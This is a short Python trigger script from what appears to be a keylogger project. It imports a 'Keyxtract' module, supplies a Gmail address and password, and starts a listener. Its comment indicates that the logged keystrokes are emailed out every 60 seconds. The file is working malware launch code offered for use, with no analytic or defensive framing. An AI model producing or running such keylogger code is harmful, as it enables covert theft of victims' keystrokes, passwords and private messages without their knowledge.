# importing our Keylogger folder to this file make use of the module Keyxtract
# starting the Listener through this trigger file

from Keylogger import Keyxtract

logger = Keyxtract.keyxtract('username@gmail.com', 'password', 60)  # 60 sec is for time_interval do not reduce lesser than 60 it will spam your mail.
logger.initiate_the_listener()
